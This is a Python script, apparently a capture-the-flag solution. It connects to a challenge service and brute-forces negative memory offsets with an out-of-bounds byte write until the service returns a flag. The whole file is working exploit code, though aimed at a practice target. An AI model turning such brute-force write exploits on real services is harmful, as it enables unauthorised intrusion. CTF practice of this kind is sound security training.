import sys, re, time, socket
sys.stdout.reconfigure(encoding="utf-8", errors="replace")
host, port = open(r"./_z_146url.txt").read().split()
port = int(port)
print("cible:", host, port)


def attempt(offset, value):
    try:
        s = socket.create_connection((host, port), timeout=8)
        s.settimeout(4)
    except Exception:
        return None
    try:
        buf = b""
        while b"Address: " not in buf:
            c = s.recv(4096)
            if not c:
                break
            buf += c
        s.sendall(str(offset).encode() + b"\n")
        t0 = time.time()
        buf = b""
        while b"Value: " not in buf and time.time() - t0 < 3:
            try:
                c = s.recv(4096)
                if not c:
                    break
                buf += c
            except socket.timeout:
                break
        s.sendall(bytes([value]))
        out = b""
        t0 = time.time()
        while time.time() - t0 < 3:
            try:
                c = s.recv(4096)
                if not c:
                    break
                out += c
            except socket.timeout:
                break
        return out.decode("latin-1", "replace")
    except Exception:
        return None
    finally:
        s.close()


base = attempt(0, ord("A"))
print("temoin (offset 0, 'A'):", repr((base or "")[:120]))
found = None
t_start = time.time()
for off in range(-4600, -5601, -1):
    r = attempt(off, 0xA0)
    if r is None:
        continue
    if "Congrats" in r or "academy{" in r:
        found = (off, r)
        print("SUCCES offset=%d apres %.0fs" % (off, time.time() - t_start))
        print(r[:400])
        break
    if off % 100 == 0:
        print("  offset %d (%.0fs)" % (off, time.time() - t_start), flush=True)
print("fin:", found[0] if found else None)
if found:
    f = re.search(r"(?:academy|picoCTF)\{[^}]*\}", found[1])
    print("FLAG:", f.group(0) if f else None)
